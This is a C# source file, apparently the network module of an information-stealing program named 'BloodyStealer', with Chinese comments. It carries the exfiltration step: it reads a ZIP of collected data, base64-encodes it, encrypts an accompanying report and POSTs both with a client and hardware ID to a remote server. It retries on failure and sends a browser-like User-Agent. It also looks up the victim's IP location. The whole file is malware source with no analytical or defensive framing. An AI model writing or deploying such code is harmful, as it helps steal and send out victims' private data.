using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace BloodyStealer
{
    /// <summary>
    /// 网络管理类，负责将收集到的数据发送到远程服务器
    /// </summary>
    internal class NetworkManager
    {
        #region 属性和字段

        /// <summary>
        /// 上传URL
        /// </summary>
        private readonly string _serverUrl;

        /// <summary>
        /// AES加密密钥
        /// </summary>
        private readonly string _encryptionKey;

        /// <summary>
        /// 最大重试次数
        /// </summary>
        private readonly int _maxRetries;

        /// <summary>
        /// 重试超时（毫秒）
        /// </summary>
        private readonly int _retryTimeout;

        /// <summary>
        /// 上传状态
        /// </summary>
        public bool IsUploaded { get; private set; } = false;

        /// <summary>
        /// 上传返回的结果消息
        /// </summary>
        public string ResponseMessage { get; private set; } = string.Empty;

        #endregion

        #region 构造函数

        /// <summary>
        /// 初始化网络管理器
        /// </summary>
        /// <param name="serverUrl">服务器URL</param>
        /// <param name="encryptionKey">加密密钥</param>
        /// <param name="maxRetries">最大重试次数</param>
        /// <param name="retryTimeout">重试超时(毫秒)</param>
        public NetworkManager(string serverUrl, string encryptionKey, int maxRetries = 3, int retryTimeout = 1000)
        {
            _serverUrl = serverUrl;
            _encryptionKey = encryptionKey;
            _maxRetries = maxRetries;
            _retryTimeout = retryTimeout;

            // 配置TLS
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.DefaultConnectionLimit = 10;
        }

        #endregion

        #region 公共方法

        /// <summary>
        /// 发送收集到的数据到服务器
        /// </summary>
        /// <param name="zipFilePath">压缩文件路径</param>
        /// <param name="clientId">客户端ID</param>
        /// <param name="reportText">报告文本</param>
        /// <returns>是否成功</returns>
        public bool SendData(string zipFilePath, string clientId, string reportText)
        {
            try
            {
                // 加密报告文本
                string encryptedReport = string.Empty;
                if (!string.IsNullOrEmpty(reportText))
                {
                    encryptedReport = Utils.EncryptString(reportText, _encryptionKey);
                }

                // 读取ZIP文件
                byte[] zipData = File.ReadAllBytes(zipFilePath);

                // 重试发送
                for (int attempt = 0; attempt < _maxRetries; attempt++)
                {
                    try
                    {
                        // 创建WebClient
                        using (WebClient client = new WebClient())
                        {
                            // 设置超时
                            client.Timeout = 30000; // 30秒

                            // 准备POST数据
                            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                            // 创建表单数据
                            var data = new Dictionary<string, object>
                            {
                                { "id", clientId },
                                { "hwid", Settings.HWID },
                                { "data", Convert.ToBase64String(zipData) }
                            };

                            if (!string.IsNullOrEmpty(encryptedReport))
                            {
                                data.Add("report", encryptedReport);
                            }

                            // 发送数据
                            string result = client.UploadString(_serverUrl, BuildPostData(data));

                            // 检查响应
                            if (!string.IsNullOrEmpty(result))
                            {
                                ResponseMessage = result;
                                IsUploaded = true;
                                return true;
                            }
                        }
                    }
                    catch (WebException ex)
                    {
                        ResponseMessage = ex.Message;

                        // 检查是否有服务器响应
                        if (ex.Response != null)
                        {
                            try
                            {
                                using (var reader = new StreamReader(ex.Response.GetResponseStream()))
                                {
                                    string responseContent = reader.ReadToEnd();
                                    if (!string.IsNullOrEmpty(responseContent))
                                    {
                                        ResponseMessage = responseContent;
                                    }
                                }
                            }
                            catch
                            {
                                // 忽略读取响应的错误
                            }
                        }

                        // 如果不是最后一次尝试，等待后重试
                        if (attempt < _maxRetries - 1)
                        {
                            Thread.Sleep(_retryTimeout);
                        }
                    }
                }

                return false;
            }
            catch (Exception ex)
            {
                ResponseMessage = $"发送数据时出错: {ex.Message}";
                return false;
            }
        }

        /// <summary>
        /// 获取地理位置信息
        /// </summary>
        /// <returns>地理位置信息字典</returns>
        public Dictionary<string, string> GetGeoLocation()
        {
            var geoInfo = new Dictionary<string, string>();

            try
            {
                using (WebClient client = new WebClient())
                {
                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    string json = client.DownloadString("http://ip-api.com/json/");

                    // 简单解析JSON（实际应用中应使用JSON库）
                    geoInfo["IP"] = ExtractJsonValue(json, "query");
                    geoInfo["Country"] = ExtractJsonValue(json, "country");
                    geoInfo["CountryCode"] = ExtractJsonValue(json, "countryCode");
                    geoInfo["Region"] = ExtractJsonValue(json, "regionName");
                    geoInfo["City"] = ExtractJsonValue(json, "city");
                    geoInfo["ISP"] = ExtractJsonValue(json, "isp");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error getting geo location: {ex.Message}");
                
                // 设置默认值
                geoInfo["IP"] = "Unknown";
                geoInfo["Country"] = "Unknown";
                geoInfo["CountryCode"] = "XX";
                geoInfo["Region"] = "Unknown";
                geoInfo["City"] = "Unknown";
                geoInfo["ISP"] = "Unknown";
            }

            return geoInfo;
        }

        /// <summary>
        /// 检查互联网连接
        /// </summary>
        /// <returns>是否有互联网连接</returns>
        public bool CheckInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://www.google.com/"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        #endregion

        #region 私有方法

        /// <summary>
        /// 将WebClient扩展以支持超时
        /// </summary>
        private class WebClient : System.Net.WebClient
        {
            public int Timeout { get; set; } = 30000; // 默认30秒

            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest request = base.GetWebRequest(address);
                if (request != null)
                {
                    request.Timeout = Timeout;
                }
                return request;
            }
        }

        /// <summary>
        /// 从JSON字符串中提取值
        /// </summary>
        /// <param name="json">JSON字符串</param>
        /// <param name="key">键名</param>
        /// <returns>提取的值</returns>
        private string ExtractJsonValue(string json, string key)
        {
            try
            {
                string pattern = $"\"{key}\"\\s*:\\s*\"([^\"]+)\"";
                var match = System.Text.RegularExpressions.Regex.Match(json, pattern);
                if (match.Success && match.Groups.Count > 1)
                {
                    return match.Groups[1].Value;
                }

                // 尝试提取非字符串值
                pattern = $"\"{key}\"\\s*:\\s*([^,\\}}]+)";
                match = System.Text.RegularExpressions.Regex.Match(json, pattern);
                if (match.Success && match.Groups.Count > 1)
                {
                    return match.Groups[1].Value.Trim();
                }
            }
            catch
            {
                // 忽略提取错误
            }

            return "Unknown";
        }

        /// <summary>
        /// 构建POST表单数据
        /// </summary>
        /// <param name="data">数据字典</param>
        /// <returns>编码后的表单数据</returns>
        private string BuildPostData(Dictionary<string, object> data)
        {
            var postData = new StringBuilder();
            bool first = true;

            foreach (var item in data)
            {
                if (!first)
                {
                    postData.Append("&");
                }

                postData.Append(Uri.EscapeDataString(item.Key));
                postData.Append("=");
                postData.Append(Uri.EscapeDataString(item.Value.ToString()));

                first = false;
            }

            return postData.ToString();
        }

        #endregion
    }
}